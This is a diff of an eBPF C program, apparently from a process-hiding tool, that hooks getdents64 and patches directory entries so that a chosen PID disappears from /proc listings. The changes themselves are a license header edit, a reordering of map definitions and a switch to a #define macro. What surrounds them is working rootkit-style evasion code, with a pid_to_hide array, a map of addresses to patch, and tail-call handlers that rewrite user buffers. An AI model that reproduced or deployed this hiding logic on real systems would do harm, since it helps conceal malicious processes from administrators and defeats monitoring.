@@ -1,4 +1,5 @@
-// SPDX-License-Identifier: BSD-3-Clause
+// SPDX-License-Identifier: GPL-2.0 OR BSD-3-Clause
+/* Copyright (c) 2020 Facebook */
 #include "vmlinux.h"
 #include <bpf/bpf_helpers.h>
 #include <bpf/bpf_tracing.h>
@@ -7,10 +8,10 @@
 
 char LICENSE[] SEC("license") = "Dual BSD/GPL";
 
-// Ringbuffer Map to pass messages from kernel to user
+// RingBuffer to send events to um
 struct {
-    __uint(type, BPF_MAP_TYPE_RINGBUF);
-    __uint(max_entries, 256 * 1024);
+	__uint(type, BPF_MAP_TYPE_RINGBUF);
+	__uint(max_entries, 256 * 1024);
 } rb SEC(".maps");
 
 // Map to fold the dents buffer addresses
@@ -30,14 +31,6 @@ struct {
     __type(value, int);
 } map_bytes_read SEC(".maps");
 
-// Map with address of actual
-struct {
-    __uint(type, BPF_MAP_TYPE_HASH);
-    __uint(max_entries, 8192);
-    __type(key, size_t);
-    __type(value, long unsigned int);
-} map_to_patch SEC(".maps");
-
 // Map to hold program tail calls
 struct {
     __uint(type, BPF_MAP_TYPE_PROG_ARRAY);
@@ -46,15 +39,23 @@ struct {
     __type(value, __u32);
 } map_prog_array SEC(".maps");
 
+// Map with address of actual
+struct {
+    __uint(type, BPF_MAP_TYPE_HASH);
+    __uint(max_entries, 8192);
+    __type(key, size_t);
+    __type(value, long unsigned int);
+} map_to_patch SEC(".maps");
+
 // Optional Target Parent PID
 const volatile int target_ppid = 0;
 
 // These store the string represenation
 // of the PID to hide. This becomes the name
 // of the folder in /proc/
-const int max_pid_len = 10;
+#define MAX_PID_LEN 10
 const volatile int pid_to_hide_len = 0;
-const volatile char pid_to_hide[max_pid_len];
+const volatile char pid_to_hide[MAX_PID_LEN];
 
 // struct linux_dirent64 {
 //     u64        d_ino;    /* 64-bit inode number */
@@ -112,7 +113,7 @@ int handle_getdents_exit(struct trace_event_raw_sys_exit *ctx)
     struct linux_dirent64 *dirp = 0;
     int pid = pid_tgid >> 32;
     short unsigned int d_reclen = 0;
-    char filename[max_pid_len];
+    char filename[MAX_PID_LEN];
 
     unsigned int bpos = 0;
     unsigned int *pBPOS = bpf_map_lookup_elem(&map_bytes_read, &pid_tgid);
@@ -182,7 +183,7 @@ int handle_getdents_patch(struct trace_event_raw_sys_exit *ctx)
     bpf_probe_read_user(&d_reclen, sizeof(d_reclen), &dirp->d_reclen);
 
     // Debug print
-    char filename[max_pid_len];
+    char filename[MAX_PID_LEN];
     bpf_probe_read_user_str(&filename, pid_to_hide_len, dirp_previous->d_name);
     filename[pid_to_hide_len-1] = 0x00;
     bpf_printk("[PID_HIDE] filename previous %s\n", filename);
